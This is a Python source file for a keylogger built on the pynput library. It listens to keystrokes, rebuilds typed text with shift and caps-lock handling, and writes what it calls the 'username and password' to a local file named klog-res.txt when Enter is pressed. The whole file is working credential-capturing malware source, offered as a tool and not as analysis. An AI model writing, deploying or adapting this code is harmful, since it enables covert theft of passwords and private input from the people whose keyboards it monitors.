from pynput.keyboard import Listener
import logging

logdir = ""
# Uploads logged keys to a file called klog-res.txt
logging.basicConfig(filename=(logdir + "klog-res.txt"), level=logging.INFO, format="%(message)s")
# logs the keys to file
LIST_OF_SPECIALS = ["Key.tab", "Key.caps_lock", "Key.shift", "Key.ctrl_l", "Key.cmd", "Key.alt_l", "Key.space",
                    "Key.alt_r", "Key.menu", "Key.left", "Key.down", "Key.right", "Key.up", "Key.insert",
                    "Key.delete", "Key.print_screen", "Key.home", "Key.end", "Key.page_up", "Key.page_down",
                    "Key.num_lock", "Key.f5", "Key.esc", "Key.delete", "Key.esc"]

caps = False
caps_lock_on = False
shift = False
username_and_password = ""
# Special symbols that can only be achieved with shift letter
special_numbers = {"1": "!", "2": "@", "3": "#", "4": "$",
                   "5": "%", "6": "^", "7": "&", "8": "*",
                   "9": "(", "0": ")", "=": "+", "-": "_", "/": "?", ",": "<", ".": ">"}


def main():
    def change_caps(key):
        """ function to tell the program if it should store uppercase or lowercase"""
        global shift
        global caps
        global caps_lock_on
        if str(key) == "Key.caps_lock":
            if not caps:
                caps = True
            else:
                caps = False
        if str(key) == "Key.shift":
            if shift:
                shift = False
                caps = False
            else:
                caps = True
                shift = True
        return

    def add_password(key):
        """Adds the letter to the username and password"""
        global caps
        global shift
        global special_numbers
        global username_and_password
        if str(key).replace("'", "") in special_numbers and shift:
            username_and_password += special_numbers[str(key).replace("'", "")]
        else:
            if str(key) == "Key.space":
                letter = " "
            else:
                letter = str(key).replace("'", '')
            if caps:
                username_and_password += letter.upper()
            else:
                username_and_password += letter
        # print(username_and_password)

    def delete_letter():
        """ Deletes a character if the user hit the backspace"""
        global username_and_password
        username_and_password = username_and_password[0:-1]

    def on_press(key):
        """ When a key is being pressed"""
        if str(key) == "Key.caps_lock" or str(key) == "Key.shift":
            change_caps(key)
            return

    def log():
        """ Logs the username and password."""
        global username_and_password
        logging.info(username_and_password)

    def on_release(key):
        """ When a key is being released"""
        global username_and_password
        global shift
        global caps
        if str(key) == "Key.shift":
            change_caps(key)
        # print('{0} released'.format(key))
        if str(key) == "Key.enter":
            print(username_and_password)
            log()
            return False
        elif str(key) == "Key.shift" or str(key) == "Key.caps_lock" or str(key) == "Key.tab":
            pass

        elif str(key) == "Key.backspace":
            delete_letter()
        else:
            add_password(key)

    # Collect events until released
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
    print("Finished logging")


if __name__ == "__main__":
    main()
